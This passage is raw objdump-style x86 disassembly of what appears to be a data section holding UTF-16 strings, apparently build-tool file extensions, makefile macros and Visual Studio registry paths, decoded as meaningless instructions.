  4016b3:	add    BYTE PTR [eax+eax*1+0x48],dl
  4016b7:	add    BYTE PTR [eax],al
  4016b9:	add    BYTE PTR [eax],al
  4016bb:	add    BYTE PTR [ebx+0x0],cl
  4016be:	inc    ebp
  4016bf:	add    BYTE PTR [edx+0x0],dl
  4016c2:	dec    esi
  4016c3:	add    BYTE PTR [ebp+0x0],al
  4016c6:	dec    esp
  4016c7:	add    BYTE PTR [ebx],dh
  4016c9:	add    BYTE PTR [edx],dh
  4016cb:	add    BYTE PTR [esi],ch
  4016cd:	add    BYTE PTR [eax+eax*1+0x4c],al
  4016d1:	add    BYTE PTR [eax+eax*1+0x0],cl
  4016d5:	add    BYTE PTR [eax],al
  4016d7:	add    BYTE PTR [esi+0x65],cl
  4016da:	gs fs inc ebx
  4016dd:	jne    0x401751
  4016df:	jb     0x401746
  4016e1:	outs   dx,BYTE PTR ds:[esi]
  4016e2:	je     0x401728
  4016e4:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4016eb:	jns    0x401733
  4016ed:	outs   dx,DWORD PTR ds:[esi]
  4016ee:	jb     0x401735
  4016f0:	js     0x401757
  4016f2:	push   eax
  4016f3:	popa   
  4016f4:	je     0x40175e
  4016f6:	push   edi
  4016f7:	add    BYTE PTR [esi],ch
  4016f9:	add    BYTE PTR [ebx],bh
  4016fb:	add    BYTE PTR [eax],al
  4016fd:	add    BYTE PTR [eax],al
  4016ff:	add    BYTE PTR [ecx],cl
  401701:	add    BYTE PTR ds:0xa007300,ah
  401707:	add    BYTE PTR [eax],al
  401709:	add    BYTE PTR [eax],al
  40170b:	add    BYTE PTR [eax+eax*1],bh
  40170e:	add    BYTE PTR ds:[eax+eax*1+0x26],bh
  401713:	add    BYTE PTR ds:0x2f000000,ah
  401719:	add    BYTE PTR [ebx+0x0],ah
  40171c:	and    BYTE PTR [eax],al
  40171e:	and    al,BYTE PTR [eax]
  401720:	add    BYTE PTR [eax],al
  401722:	add    BYTE PTR [eax],al
  401724:	das    
  401725:	add    BYTE PTR [ebx+0x0],ah
  401728:	add    BYTE PTR [eax],al
  40172a:	add    BYTE PTR [eax],al
  40172c:	inc    ebx
  40172d:	add    BYTE PTR [edi+0x0],cl
  401730:	dec    ebp
  401731:	add    BYTE PTR [ebx+0x0],dl
  401734:	push   eax
  401735:	add    BYTE PTR [ebp+0x0],al
  401738:	inc    ebx
  401739:	add    BYTE PTR [eax],al
  40173b:	add    BYTE PTR [ebx+0x0],al
  40173e:	dec    ebp
  40173f:	add    BYTE PTR [eax+eax*1+0x2e],al
  401743:	add    BYTE PTR [ebp+0x0],al
  401746:	pop    eax
  401747:	add    BYTE PTR [ebp+0x0],al
  40174a:	add    BYTE PTR [eax],al
  40174c:	inc    esp
  40174d:	add    BYTE PTR [esi+0x0],al
  401750:	inc    edx
  401751:	add    BYTE PTR [edx+0x0],dl
  401754:	add    BYTE PTR [eax],al
  401756:	add    BYTE PTR [eax],al
  401758:	and    al,BYTE PTR [eax]
  40175a:	pop    esi
  40175b:	add    BYTE PTR [edx],ch
  40175d:	add    BYTE PTR [edi],bh
  40175f:	add    BYTE PTR [eax],al
  401761:	add    BYTE PTR [eax],al
  401763:	add    BYTE PTR [eax+eax*1+0x74],bl
  401767:	add    BYTE PTR [eax],al
  401769:	add    BYTE PTR [eax],al
  40176b:	add    BYTE PTR [ecx],cl
  40176d:	add    BYTE PTR [eax],al
  40176f:	add    BYTE PTR [ecx+0x0],cl
  401772:	dec    esi
  401773:	add    BYTE PTR [ebx+0x0],al
  401776:	dec    esp
  401777:	add    BYTE PTR [ebp+0x0],dl
  40177a:	inc    esp
  40177b:	add    BYTE PTR [ebp+0x0],al
  40177e:	add    BYTE PTR [eax],al
  401780:	inc    ebx
  401781:	add    BYTE PTR [ebp+0x0],cl
  401784:	inc    esp
  401785:	add    BYTE PTR [ebx+0x0],dl
  401788:	push   edi
  401789:	add    BYTE PTR [ecx+0x0],cl
  40178c:	push   esp
  40178d:	add    BYTE PTR [ebx+0x0],al
  401790:	dec    eax
  401791:	add    BYTE PTR [ebp+0x0],al
  401794:	push   ebx
  401795:	add    BYTE PTR [eax],al
  401797:	add    BYTE PTR [ebp+0x0],al
  40179a:	push   edx
  40179b:	add    BYTE PTR [edx+0x0],dl
  40179e:	dec    edi
  40179f:	add    BYTE PTR [edx+0x0],dl
  4017a2:	add    BYTE PTR [eax],al
  4017a4:	dec    ebp
  4017a5:	add    BYTE PTR [ebp+0x0],al
  4017a8:	push   ebx
  4017a9:	add    BYTE PTR [ebx+0x0],dl
  4017ac:	inc    ecx
  4017ad:	add    BYTE PTR [edi+0x0],al
  4017b0:	inc    ebp
  4017b1:	add    BYTE PTR [eax],al
  4017b3:	add    BYTE PTR [ebp+0x0],dl
  4017b6:	dec    esi
  4017b7:	add    BYTE PTR [eax+eax*1+0x45],al
  4017bb:	add    BYTE PTR [esi+0x0],al
  4017be:	add    BYTE PTR [eax],al
  4017c0:	inc    esp
  4017c1:	add    BYTE PTR [ecx+0x0],cl
  4017c4:	dec    esi
  4017c5:	add    BYTE PTR [ebx+0x0],dl
  4017c8:	push   ebp
  4017c9:	add    BYTE PTR [eax],al
  4017cb:	add    BYTE PTR [ecx+0x0],al
  4017ce:	inc    edx
  4017cf:	add    BYTE PTR [ebx+0x0],al
  4017d2:	inc    ebp
  4017d3:	add    BYTE PTR [ebx+0x0],cl
  4017d6:	dec    esp
  4017d7:	add    BYTE PTR [eax+0x0],dl
  4017da:	push   ecx
  4017db:	add    BYTE PTR [edx+0x0],dl
  4017de:	push   esp
  4017df:	add    BYTE PTR [ecx+0x0],bl
  4017e2:	add    BYTE PTR [eax],al
  4017e4:	inc    ecx
  4017e5:	add    BYTE PTR [edx+0x0],al
  4017e8:	inc    ebx
  4017e9:	add    BYTE PTR [ebp+0x0],al
  4017ec:	dec    ebx
  4017ed:	add    BYTE PTR [eax+eax*1+0x4d],cl
  4017f1:	add    BYTE PTR [eax+0x0],dl
  4017f4:	push   ecx
  4017f5:	add    BYTE PTR [edx+0x0],dl
  4017f8:	push   esp
  4017f9:	add    BYTE PTR [esi+0x0],dl
  4017fc:	add    BYTE PTR [eax],al
  4017fe:	add    BYTE PTR [eax],al
  401800:	dec    ecx
  401801:	add    BYTE PTR [esi+0x0],al
  401804:	add    BYTE PTR [eax],al
  401806:	add    BYTE PTR [eax],al
  401808:	dec    ecx
  401809:	add    BYTE PTR [esi+0x0],al
  40180c:	inc    esp
  40180d:	add    BYTE PTR [ebp+0x0],al
  401810:	inc    esi
  401811:	add    BYTE PTR [eax],al
  401813:	add    BYTE PTR [ecx+0x0],cl
  401816:	inc    esi
  401817:	add    BYTE PTR [esi+0x0],cl
  40181a:	inc    esp
  40181b:	add    BYTE PTR [ebp+0x0],al
  40181e:	inc    esi
  40181f:	add    BYTE PTR [eax],al
  401821:	add    BYTE PTR [eax],al
  401823:	add    BYTE PTR [ebp+0x0],al
  401826:	dec    esp
  401827:	add    BYTE PTR [ebx+0x0],dl
  40182a:	inc    ebp
  40182b:	add    BYTE PTR [eax],al
  40182d:	add    BYTE PTR [eax],al
  40182f:	add    BYTE PTR [ebp+0x0],al
  401832:	dec    esp
  401833:	add    BYTE PTR [ebx+0x0],dl
  401836:	inc    ebp
  401837:	add    BYTE PTR [ecx+0x0],cl
  40183a:	inc    esi
  40183b:	add    BYTE PTR [eax],al
  40183d:	add    BYTE PTR [eax],al
  40183f:	add    BYTE PTR [ebp+0x0],al
  401842:	dec    esp
  401843:	add    BYTE PTR [ebx+0x0],dl
  401846:	inc    ebp
  401847:	add    BYTE PTR [ecx+0x0],cl
  40184a:	inc    esi
  40184b:	add    BYTE PTR [eax+eax*1+0x45],al
  40184f:	add    BYTE PTR [esi+0x0],al
  401852:	add    BYTE PTR [eax],al
  401854:	inc    ebp
  401855:	add    BYTE PTR [eax+eax*1+0x53],cl
  401859:	add    BYTE PTR [ebp+0x0],al
  40185c:	dec    ecx
  40185d:	add    BYTE PTR [esi+0x0],al
  401860:	dec    esi
  401861:	add    BYTE PTR [eax+eax*1+0x45],al
  401865:	add    BYTE PTR [esi+0x0],al
  401868:	add    BYTE PTR [eax],al
  40186a:	add    BYTE PTR [eax],al
  40186c:	inc    ebp
  40186d:	add    BYTE PTR [esi+0x0],cl
  401870:	inc    esp
  401871:	add    BYTE PTR [ecx+0x0],cl
  401874:	inc    esi
  401875:	add    BYTE PTR [eax],al
  401877:	add    BYTE PTR [ebp+0x0],al
  40187a:	dec    edi
  40187b:	add    BYTE PTR [esi+0x0],al
  40187e:	add    BYTE PTR [eax],al
  401880:	cmp    al,0x0
  401882:	cmp    al,0x0
  401884:	add    BYTE PTR [eax],al
  401886:	add    BYTE PTR [eax],al
  401888:	outs   dx,BYTE PTR ds:[esi]
  401889:	add    BYTE PTR [ebp+0x0],ch
  40188c:	add    BYTE PTR [eax],al
  40188e:	add    BYTE PTR [eax],al
  401890:	ja     0x401892
  401892:	bound  eax,QWORD PTR [eax]
  401894:	add    BYTE PTR [eax],al
  401896:	add    BYTE PTR [eax],al
  401898:	add    BYTE PTR ds:[esi],bh
  40189b:	add    BYTE PTR [eax],al
  40189d:	add    BYTE PTR [eax],al
  40189f:	add    BYTE PTR [esi],bh
  4018a1:	add    BYTE PTR [eax],al
  4018a3:	add    BYTE PTR [ecx],cl
  4018a5:	add    BYTE PTR [ebp+0x0],ah
  4018a8:	arpl   WORD PTR [eax],ax
  4018aa:	push   0x2e006f00
  4018af:	add    BYTE PTR [eax],ah
  4018b1:	add    BYTE PTR ds:0x20007300,ah
  4018b7:	add    BYTE PTR ds:0xa007300,ah
  4018bd:	add    BYTE PTR [eax],al
  4018bf:	add    BYTE PTR [ecx],cl
  4018c1:	add    BYTE PTR [ebp+0x0],ah
  4018c4:	arpl   WORD PTR [eax],ax
  4018c6:	push   0x20006f00
  4018cb:	add    BYTE PTR ds:0x20007300,ah
  4018d1:	add    BYTE PTR ds:0x20007300,ah
  4018d7:	add    BYTE PTR ds:0xa007300,ah
  4018dd:	add    BYTE PTR [eax],al
  4018df:	add    BYTE PTR [ebx+0x0],ch
  4018e2:	add    BYTE PTR gs:[ebp+0x0],ah
  4018e6:	jo     0x4018e8
  4018e8:	add    BYTE PTR [eax],al
  4018ea:	add    BYTE PTR [eax],al
  4018ec:	outs   dx,BYTE PTR ds:[esi]
  4018ed:	add    BYTE PTR [edi+0x0],ch
  4018f0:	imul   eax,DWORD PTR [eax],0x65
  4018f3:	add    BYTE PTR [ebp+0x0],ah
  4018f6:	jo     0x4018f8
  4018f8:	add    BYTE PTR [eax],al
  4018fa:	add    BYTE PTR [eax],al
  4018fc:	jne    0x4018fe
  4018fe:	outs   dx,BYTE PTR ds:[esi]
  4018ff:	add    BYTE PTR [ecx+0x0],ch
  401902:	arpl   WORD PTR [eax],ax
  401904:	outs   dx,DWORD PTR ds:[esi]
  401905:	add    BYTE PTR [eax+eax*1+0x65],ah
  401909:	add    BYTE PTR [eax],al
  40190b:	add    BYTE PTR [eax+eax*1+0x4d],dl
  40190f:	add    BYTE PTR [eax+0x0],dl
  401912:	add    BYTE PTR [eax],al
  401914:	add    BYTE PTR cs:[eax],al
  401917:	add    BYTE PTR ds:0xd00000a,cl
  40191d:	add    BYTE PTR [edx],cl
  40191f:	add    bh,bh
  401921:	inc    BYTE PTR [eax]
  401923:	add    BYTE PTR [eax+eax*1],ch
  401926:	and    BYTE PTR [eax],al
  401928:	or     DWORD PTR [eax],eax
  40192a:	add    BYTE PTR [eax],al
  40192c:	imul   eax,DWORD PTR [eax],0x63006e
  401932:	ins    BYTE PTR es:[edi],dx
  401933:	add    BYTE PTR [ebp+0x0],dh
  401936:	add    BYTE PTR fs:[ebp+0x0],ah
  40193a:	add    BYTE PTR [eax],al
  40193c:	or     DWORD PTR [eax],eax
  40193e:	and    eax,DWORD PTR [eax]
  401940:	add    BYTE PTR [eax],al
  401942:	add    BYTE PTR [eax],al
  401944:	pop    esp
  401945:	add    BYTE PTR [edi],ch
  401947:	add    BYTE PTR [edx],bh
  401949:	add    BYTE PTR [eax],al
  40194b:	add    BYTE PTR [eax+eax*1+0x0],bl
  40194f:	add    BYTE PTR [ecx+0x0],cl
  401952:	outs   dx,BYTE PTR ds:[esi]
  401953:	add    BYTE PTR [ebx+0x0],ah
  401956:	ins    BYTE PTR es:[edi],dx
  401957:	add    BYTE PTR [ebp+0x0],dh
  40195a:	add    BYTE PTR fs:[ebp+0x0],ah
  40195e:	add    BYTE PTR fs:[edx],bh
  401961:	add    BYTE PTR [eax],ah
  401963:	add    BYTE PTR ds:0xa007300,ah
  401969:	add    BYTE PTR [eax],al
  40196b:	add    BYTE PTR [esi+0x0],dl
  40196e:	push   ebx
  40196f:	add    BYTE PTR [eax+eax*1+0x41],cl
  401973:	add    BYTE PTR [esi+0x0],cl
  401976:	inc    edi
  401977:	add    BYTE PTR [eax],al
  401979:	add    BYTE PTR [eax],al
  40197b:	add    BYTE PTR [esi+0x0],dl
  40197e:	push   ebx
  40197f:	add    BYTE PTR [edi+0x0],bl
  401982:	push   ebp
  401983:	add    BYTE PTR [esi+0x0],cl
  401986:	dec    ecx
  401987:	add    BYTE PTR [ebx+0x0],al
  40198a:	dec    edi
  40198b:	add    BYTE PTR [eax+eax*1+0x45],al
  40198f:	add    BYTE PTR [edi+0x0],bl
  401992:	dec    edi
  401993:	add    BYTE PTR [ebp+0x0],dl
  401996:	push   esp
  401997:	add    BYTE PTR [eax+0x0],dl
  40199a:	push   ebp
  40199b:	add    BYTE PTR [eax+eax*1+0x0],dl
  40199f:	add    BYTE PTR [ecx],dh
  4019a1:	add    BYTE PTR [eax],dh
  4019a3:	add    BYTE PTR [ebx],dh
  4019a5:	add    BYTE PTR [ebx],dh
  4019a7:	add    BYTE PTR [eax],al
  4019a9:	add    BYTE PTR [eax],al
  4019ab:	add    BYTE PTR [edx],ch
  4019ad:	add    BYTE PTR [eax],al
  4019af:	add    BYTE PTR [esi],ch
  4019b1:	add    BYTE PTR [esi],ch
  4019b3:	add    BYTE PTR [eax],al
  4019b5:	add    BYTE PTR [eax],al
  4019b7:	add    BYTE PTR ds:0x75006800,ah
  4019bd:	add    BYTE PTR ds:0x6300,ah
  4019c3:	add    BYTE PTR [esi],ch
  4019c5:	add    BYTE PTR [ebx+0x0],dl
  4019c8:	push   ebp
  4019c9:	add    BYTE PTR [esi+0x0],al
  4019cc:	inc    esi
  4019cd:	add    BYTE PTR [ecx+0x0],cl
  4019d0:	pop    eax
  4019d1:	add    BYTE PTR [ebp+0x0],al
  4019d4:	push   ebx
  4019d5:	add    BYTE PTR [eax],al
  4019d7:	add    BYTE PTR [esi],ch
  4019d9:	add    BYTE PTR [ecx+0x0],ah
  4019dc:	jae    0x4019de
  4019de:	ins    DWORD PTR es:[edi],dx
  4019df:	add    BYTE PTR [esi],ch
  4019e1:	add    BYTE PTR [ebp+0x0],ah
  4019e4:	js     0x4019e6
  4019e6:	add    BYTE PTR gs:[eax],al
  4019e9:	add    BYTE PTR [eax],al
  4019eb:	add    BYTE PTR [esi],ch
  4019ed:	add    BYTE PTR [ecx+0x0],ah
  4019f0:	jae    0x4019f2
  4019f2:	ins    DWORD PTR es:[edi],dx
  4019f3:	add    BYTE PTR [esi],ch
  4019f5:	add    BYTE PTR [edi+0x0],ch
  4019f8:	bound  eax,QWORD PTR [eax]
  4019fa:	push   0x0
  4019fc:	add    BYTE PTR [eax],al
  4019fe:	add    BYTE PTR [eax],al
  401a00:	add    BYTE PTR cs:[ebx+0x0],ah
  401a04:	add    BYTE PTR cs:[ebp+0x0],ah
  401a08:	js     0x401a0a
  401a0a:	add    BYTE PTR gs:[eax],al
  401a0d:	add    BYTE PTR [eax],al
  401a0f:	add    BYTE PTR [esi],ch
  401a11:	add    BYTE PTR [ebx+0x0],ah
  401a14:	add    BYTE PTR cs:[edi+0x0],ch
  401a18:	bound  eax,QWORD PTR [eax]
  401a1a:	push   0x0
  401a1c:	add    BYTE PTR [eax],al
  401a1e:	add    BYTE PTR [eax],al
  401a20:	add    BYTE PTR cs:[ebx+0x0],ah
  401a24:	arpl   WORD PTR [eax],ax
  401a26:	add    BYTE PTR cs:[ebp+0x0],ah
  401a2a:	js     0x401a2c
  401a2c:	add    BYTE PTR gs:[eax],al
  401a2f:	add    BYTE PTR [esi],ch
  401a31:	add    BYTE PTR [ebx+0x0],ah
  401a34:	arpl   WORD PTR [eax],ax
  401a36:	add    BYTE PTR cs:[edi+0x0],ch
  401a3a:	bound  eax,QWORD PTR [eax]
  401a3c:	push   0x0
  401a3e:	add    BYTE PTR [eax],al
  401a40:	add    BYTE PTR cs:[ebx+0x0],ah
  401a44:	jo     0x401a46
  401a46:	jo     0x401a48
  401a48:	add    BYTE PTR cs:[ebp+0x0],ah
  401a4c:	js     0x401a4e
  401a4e:	add    BYTE PTR gs:[eax],al
  401a51:	add    BYTE PTR [eax],al
  401a53:	add    BYTE PTR [esi],ch
  401a55:	add    BYTE PTR [ebx+0x0],ah
  401a58:	jo     0x401a5a
  401a5a:	jo     0x401a5c
  401a5c:	add    BYTE PTR cs:[edi+0x0],ch
  401a60:	bound  eax,QWORD PTR [eax]
  401a62:	push   0x0
  401a64:	add    BYTE PTR [eax],al
  401a66:	add    BYTE PTR [eax],al
  401a68:	add    BYTE PTR cs:[ebx+0x0],ah
  401a6c:	js     0x401a6e
  401a6e:	js     0x401a70
  401a70:	add    BYTE PTR cs:[ebp+0x0],ah
  401a74:	js     0x401a76
  401a76:	add    BYTE PTR gs:[eax],al
  401a79:	add    BYTE PTR [eax],al
  401a7b:	add    BYTE PTR [esi],ch
  401a7d:	add    BYTE PTR [ebx+0x0],ah
  401a80:	js     0x401a82
  401a82:	js     0x401a84
  401a84:	add    BYTE PTR cs:[edi+0x0],ch
  401a88:	bound  eax,QWORD PTR [eax]
  401a8a:	push   0x0
  401a8c:	add    BYTE PTR [eax],al
  401a8e:	add    BYTE PTR [eax],al
  401a90:	add    BYTE PTR cs:[edx+0x0],dh
  401a94:	arpl   WORD PTR [eax],ax
  401a96:	add    BYTE PTR cs:[edx+0x0],dh
  401a9a:	add    BYTE PTR gs:[ebx+0x0],dh
  401a9e:	add    BYTE PTR [eax],al
  401aa0:	cmp    al,BYTE PTR [eax]
  401aa2:	add    BYTE PTR [eax],al
  401aa4:	add    BYTE PTR cs:[edi+0x0],ch
  401aa8:	bound  eax,QWORD PTR [eax]
  401aaa:	push   0x0
  401aac:	add    BYTE PTR [eax],al
  401aae:	add    BYTE PTR [eax],al
  401ab0:	add    BYTE PTR cs:[ecx+0x0],ah
  401ab4:	jae    0x401ab6
  401ab6:	ins    DWORD PTR es:[edi],dx
  401ab7:	add    BYTE PTR [eax],al
  401ab9:	add    BYTE PTR [eax],al
  401abb:	add    BYTE PTR [esi],ch
  401abd:	add    BYTE PTR [ebx+0x0],ah
  401ac0:	add    BYTE PTR [eax],al
  401ac2:	add    BYTE PTR [eax],al
  401ac4:	add    BYTE PTR cs:[ebx+0x0],ah
  401ac8:	arpl   WORD PTR [eax],ax
  401aca:	add    BYTE PTR [eax],al
  401acc:	add    BYTE PTR cs:[ebx+0x0],ah
  401ad0:	jo     0x401ad2
  401ad2:	jo     0x401ad4
  401ad4:	add    BYTE PTR [eax],al
  401ad6:	add    BYTE PTR [eax],al
  401ad8:	add    BYTE PTR cs:[ebx+0x0],ah
  401adc:	js     0x401ade
  401ade:	js     0x401ae0
  401ae0:	add    BYTE PTR [eax],al
  401ae2:	add    BYTE PTR [eax],al
  401ae4:	add    BYTE PTR cs:[esi+0x0],ah
  401ae8:	add    BYTE PTR [eax],al
  401aea:	add    BYTE PTR [eax],al
  401aec:	add    BYTE PTR cs:[esi+0x0],ah
  401af0:	cmp    DWORD PTR [eax],eax
  401af2:	xor    BYTE PTR [eax],al
  401af4:	add    BYTE PTR [eax],al
  401af6:	add    BYTE PTR [eax],al
  401af8:	add    BYTE PTR cs:[esi+0x0],ah
  401afc:	outs   dx,DWORD PTR ds:[esi]
  401afd:	add    BYTE PTR [edx+0x0],dh
  401b00:	add    BYTE PTR [eax],al
  401b02:	add    BYTE PTR [eax],al
  401b04:	add    BYTE PTR cs:[edx+0x0],dh
  401b08:	arpl   WORD PTR [eax],ax
  401b0a:	add    BYTE PTR [eax],al
  401b0c:	and    al,0x0
  401b0e:	sub    BYTE PTR [eax],al
  401b10:	inc    ecx
  401b11:	add    BYTE PTR [ebx+0x0],dl
  401b14:	sub    DWORD PTR [eax],eax
  401b16:	and    BYTE PTR [eax],al
  401b18:	and    al,0x0
  401b1a:	sub    BYTE PTR [eax],al
  401b1c:	inc    ecx
  401b1d:	add    BYTE PTR [esi+0x0],al
  401b20:	dec    esp
  401b21:	add    BYTE PTR [ecx+0x0],al
  401b24:	inc    edi
  401b25:	add    BYTE PTR [ebx+0x0],dl
  401b28:	sub    DWORD PTR [eax],eax
  401b2a:	and    BYTE PTR [eax],al
  401b2c:	and    al,0x0
  401b2e:	cmp    al,0x0
  401b30:	add    BYTE PTR [eax],al
  401b32:	add    BYTE PTR [eax],al
  401b34:	cmp    al,BYTE PTR [eax]
  401b36:	cmp    al,BYTE PTR [eax]
  401b38:	add    BYTE PTR [eax],al
  401b3a:	add    BYTE PTR [eax],al
  401b3c:	and    al,0x0
  401b3e:	sub    BYTE PTR [eax],al
  401b40:	inc    ecx
  401b41:	add    BYTE PTR [ebx+0x0],dl
  401b44:	sub    DWORD PTR [eax],eax
  401b46:	and    BYTE PTR [eax],al
  401b48:	and    al,0x0
  401b4a:	sub    BYTE PTR [eax],al
  401b4c:	inc    ecx
  401b4d:	add    BYTE PTR [esi+0x0],al
  401b50:	dec    esp
  401b51:	add    BYTE PTR [ecx+0x0],al
  401b54:	inc    edi
  401b55:	add    BYTE PTR [ebx+0x0],dl
  401b58:	sub    DWORD PTR [eax],eax
  401b5a:	and    BYTE PTR [eax],al
  401b5c:	das    
  401b5d:	add    BYTE PTR [ebx+0x0],ah
  401b60:	and    BYTE PTR [eax],al
  401b62:	and    al,0x0
  401b64:	cmp    al,0x0
  401b66:	add    BYTE PTR [eax],al
  401b68:	and    al,0x0
  401b6a:	sub    BYTE PTR [eax],al
  401b6c:	inc    ebx
  401b6d:	add    BYTE PTR [ebx+0x0],al
  401b70:	sub    DWORD PTR [eax],eax
  401b72:	and    BYTE PTR [eax],al
  401b74:	and    al,0x0
  401b76:	sub    BYTE PTR [eax],al
  401b78:	inc    ebx
  401b79:	add    BYTE PTR [esi+0x0],al
  401b7c:	dec    esp
  401b7d:	add    BYTE PTR [ecx+0x0],al
  401b80:	inc    edi
  401b81:	add    BYTE PTR [ebx+0x0],dl
  401b84:	sub    DWORD PTR [eax],eax
  401b86:	and    BYTE PTR [eax],al
  401b88:	and    al,0x0
  401b8a:	cmp    al,0x0
  401b8c:	add    BYTE PTR [eax],al
  401b8e:	add    BYTE PTR [eax],al
  401b90:	and    al,0x0
  401b92:	sub    BYTE PTR [eax],al
  401b94:	inc    ebx
  401b95:	add    BYTE PTR [ebx+0x0],al
  401b98:	sub    DWORD PTR [eax],eax
  401b9a:	and    BYTE PTR [eax],al
  401b9c:	and    al,0x0
  401b9e:	sub    BYTE PTR [eax],al
  401ba0:	inc    ebx
  401ba1:	add    BYTE PTR [esi+0x0],al
  401ba4:	dec    esp
  401ba5:	add    BYTE PTR [ecx+0x0],al
  401ba8:	inc    edi
  401ba9:	add    BYTE PTR [ebx+0x0],dl
  401bac:	sub    DWORD PTR [eax],eax
  401bae:	and    BYTE PTR [eax],al
  401bb0:	das    
  401bb1:	add    BYTE PTR [ebx+0x0],ah
  401bb4:	and    BYTE PTR [eax],al
  401bb6:	and    al,0x0
  401bb8:	cmp    al,0x0
  401bba:	add    BYTE PTR [eax],al
  401bbc:	and    al,0x0
  401bbe:	sub    BYTE PTR [eax],al
  401bc0:	inc    ebx
  401bc1:	add    BYTE PTR [eax+0x0],dl
  401bc4:	push   eax
  401bc5:	add    BYTE PTR [ecx],ch
  401bc7:	add    BYTE PTR [eax],ah
  401bc9:	add    BYTE PTR [eax+eax*1],ah
  401bcc:	sub    BYTE PTR [eax],al
  401bce:	inc    ebx
  401bcf:	add    BYTE PTR [eax+0x0],dl
  401bd2:	push   eax
  401bd3:	add    BYTE PTR [esi+0x0],al
  401bd6:	dec    esp
  401bd7:	add    BYTE PTR [ecx+0x0],al
  401bda:	inc    edi
  401bdb:	add    BYTE PTR [ebx+0x0],dl
  401bde:	sub    DWORD PTR [eax],eax
  401be0:	and    BYTE PTR [eax],al
  401be2:	and    al,0x0
  401be4:	cmp    al,0x0
  401be6:	add    BYTE PTR [eax],al
  401be8:	and    al,0x0
  401bea:	sub    BYTE PTR [eax],al
  401bec:	inc    ebx
  401bed:	add    BYTE PTR [eax+0x0],dl
  401bf0:	push   eax
  401bf1:	add    BYTE PTR [ecx],ch
  401bf3:	add    BYTE PTR [eax],ah
  401bf5:	add    BYTE PTR [eax+eax*1],ah
  401bf8:	sub    BYTE PTR [eax],al
  401bfa:	inc    ebx
  401bfb:	add    BYTE PTR [eax+0x0],dl
  401bfe:	push   eax
  401bff:	add    BYTE PTR [esi+0x0],al
  401c02:	dec    esp
  401c03:	add    BYTE PTR [ecx+0x0],al
  401c06:	inc    edi
  401c07:	add    BYTE PTR [ebx+0x0],dl
  401c0a:	sub    DWORD PTR [eax],eax
  401c0c:	and    BYTE PTR [eax],al
  401c0e:	das    
  401c0f:	add    BYTE PTR [ebx+0x0],ah
  401c12:	and    BYTE PTR [eax],al
  401c14:	and    al,0x0
  401c16:	cmp    al,0x0
  401c18:	add    BYTE PTR [eax],al
  401c1a:	add    BYTE PTR [eax],al
  401c1c:	and    al,0x0
  401c1e:	sub    BYTE PTR [eax],al
  401c20:	inc    ebx
  401c21:	add    BYTE PTR [eax+0x0],bl
  401c24:	pop    eax
  401c25:	add    BYTE PTR [ecx],ch
  401c27:	add    BYTE PTR [eax],ah
  401c29:	add    BYTE PTR [eax+eax*1],ah
  401c2c:	sub    BYTE PTR [eax],al
  401c2e:	inc    ebx
  401c2f:	add    BYTE PTR [eax+0x0],bl
  401c32:	pop    eax
  401c33:	add    BYTE PTR [esi+0x0],al
  401c36:	dec    esp
  401c37:	add    BYTE PTR [ecx+0x0],al
  401c3a:	inc    edi
  401c3b:	add    BYTE PTR [ebx+0x0],dl
  401c3e:	sub    DWORD PTR [eax],eax
  401c40:	and    BYTE PTR [eax],al
  401c42:	and    al,0x0
  401c44:	cmp    al,0x0
  401c46:	add    BYTE PTR [eax],al
  401c48:	and    al,0x0
  401c4a:	sub    BYTE PTR [eax],al
  401c4c:	inc    ebx
  401c4d:	add    BYTE PTR [eax+0x0],bl
  401c50:	pop    eax
  401c51:	add    BYTE PTR [ecx],ch
  401c53:	add    BYTE PTR [eax],ah
  401c55:	add    BYTE PTR [eax+eax*1],ah
  401c58:	sub    BYTE PTR [eax],al
  401c5a:	inc    ebx
  401c5b:	add    BYTE PTR [eax+0x0],bl
  401c5e:	pop    eax
  401c5f:	add    BYTE PTR [esi+0x0],al
  401c62:	dec    esp
  401c63:	add    BYTE PTR [ecx+0x0],al
  401c66:	inc    edi
  401c67:	add    BYTE PTR [ebx+0x0],dl
  401c6a:	sub    DWORD PTR [eax],eax
  401c6c:	and    BYTE PTR [eax],al
  401c6e:	das    
  401c6f:	add    BYTE PTR [ebx+0x0],ah
  401c72:	and    BYTE PTR [eax],al
  401c74:	and    al,0x0
  401c76:	cmp    al,0x0
  401c78:	add    BYTE PTR [eax],al
  401c7a:	add    BYTE PTR [eax],al
  401c7c:	and    al,0x0
  401c7e:	sub    BYTE PTR [eax],al
  401c80:	push   edx
  401c81:	add    BYTE PTR [ebx+0x0],al
  401c84:	sub    DWORD PTR [eax],eax
  401c86:	and    BYTE PTR [eax],al
  401c88:	and    al,0x0
  401c8a:	sub    BYTE PTR [eax],al
  401c8c:	push   edx
  401c8d:	add    BYTE PTR [esi+0x0],al
  401c90:	dec    esp
  401c91:	add    BYTE PTR [ecx+0x0],al
  401c94:	inc    edi
  401c95:	add    BYTE PTR [ebx+0x0],dl
  401c98:	sub    DWORD PTR [eax],eax
  401c9a:	and    BYTE PTR [eax],al
  401c9c:	das    
  401c9d:	add    BYTE PTR [edx+0x0],dh
  401ca0:	and    BYTE PTR [eax],al
  401ca2:	and    al,0x0
  401ca4:	cmp    al,0x0
  401ca6:	add    BYTE PTR [eax],al
  401ca8:	push   ebx
  401ca9:	add    BYTE PTR [edi+0x0],ch
  401cac:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401cb1:	add    BYTE PTR [ecx+0x0],ah
  401cb4:	jb     0x401cb6
  401cb6:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401cbb:	add    BYTE PTR [ecx+0x0],ch
  401cbe:	arpl   WORD PTR [eax],ax
  401cc0:	jb     0x401cc2
  401cc2:	outs   dx,DWORD PTR ds:[esi]
  401cc3:	add    BYTE PTR [ebx+0x0],dh
  401cc6:	outs   dx,DWORD PTR ds:[esi]
  401cc7:	add    BYTE PTR [esi+0x0],ah
  401cca:	je     0x401ccc
  401ccc:	pop    esp
  401ccd:	add    BYTE PTR [esi+0x0],dl
  401cd0:	imul   eax,DWORD PTR [eax],0x750073
  401cd6:	popa   
  401cd7:	add    BYTE PTR [eax+eax*1+0x53],ch
  401cdb:	add    BYTE PTR [eax+eax*1+0x75],dh
  401cdf:	add    BYTE PTR [eax+eax*1+0x69],ah
  401ce3:	add    BYTE PTR [edi+0x0],ch
  401ce6:	pop    esp
  401ce7:	add    BYTE PTR [ecx],bh
  401ce9:	add    BYTE PTR [esi],ch
  401ceb:	add    BYTE PTR [eax],dh
  401ced:	add    BYTE PTR [eax+eax*1+0x47],bl
